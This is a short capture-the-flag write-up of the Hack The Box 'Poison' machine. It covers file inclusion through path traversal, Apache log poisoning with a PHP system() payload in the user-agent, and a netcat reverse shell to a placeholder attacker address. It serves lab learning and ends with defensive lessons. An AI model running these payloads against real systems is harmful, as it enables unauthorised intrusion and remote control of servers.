#Hack The Box: "Poison" Challenge Writeup
#Objective:

The task was to exploit a vulnerable LFI (Local File Inclusion) vulnerability on a web application and escalate privileges to root.

#Step 1: Identifying the LFI Vulnerability

    -Scanned the website and found a vulnerable file inclusion path:

    'bash
    'http://<target_ip>/index.php?page=../../../../etc/passwd

    -Accessed sensitive system files like /etc/passwd.

#Step 2: Exploiting LFI for Remote Code Execution

    -Used the LFI to read the Apache logs and inject a reverse shell by modifying the user-agent:
    
    'bash
    'curl -A "<?php system($_GET['cmd']); ?>" http://<target_ip>/index.php?page=../../../../var/log/apache2/access.log

 -Executed the reverse shell:

    'bash
    'http://<target_ip>/index.php?page=../../../../var/log/apache2/access.log&cmd=nc -e /bin/sh <your_ip> <your_port>

#Step 3: Privilege Escalation

    -After gaining a low-privileged shell, exploited a SUID binary on the system to gain root access.

#Lessons Learned:

    -LFI vulnerabilities can lead to severe consequences, including full system compromise if misconfigured.
    -Itâ€™s crucial to properly sanitize file paths in web applications.
